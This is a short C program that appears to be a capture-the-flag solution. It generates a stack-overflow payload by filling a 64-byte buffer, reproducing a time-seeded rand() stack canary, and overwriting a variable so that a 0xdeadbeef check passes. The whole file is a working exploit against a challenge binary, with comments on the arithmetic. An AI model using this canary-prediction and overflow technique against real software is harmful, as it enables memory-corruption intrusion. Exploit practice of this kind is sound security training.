#include <stdio.h>
#include <stdlib.h>

int main() {
    // Fill up name[64] array
    for (int i = 0; i < 64; i++) {
        printf("A");
    }

    // Fill canary with exact same rand() values
    srand(time(NULL));

    // https://stackoverflow.com/questions/3784263/converting-an-int-into-a-4-byte-char-array-c
    union {
        unsigned int integer;
        unsigned char byte[4];
    } canary[10];

    for (int i = 0; i < 10; i++) {
        canary[i].integer = rand();
        printf("%c%c%c%c", 
            canary[i].byte[0],
            canary[i].byte[1],
            canary[i].byte[2],
            canary[i].byte[3]
        );
    }

    // Somehow, in certain situations, I can't modify multiple parameter.
    // Since `secret` is always 0x00 and `j` is always 10 (from the for-loop)
    // The best method is to only control the variable `i` at offset 4.

    // Using (secret - i + j == 0xdeadbeef),
    // then (0x00 - i + 10 == 0xdeadbeef)

    // Calculate using printf()
    // >> printf("%x", -0xdeadbeef+0xa);
    // hence, i = 0x2152411b
    printf("aaaa\x1b\x41\x52\x21"); // i
    //printf("aaaabaaacaaadaaaeaaa\xef\xbe\xad\xde"); // i

    // Send to program
    printf("\n");

    return 0;
}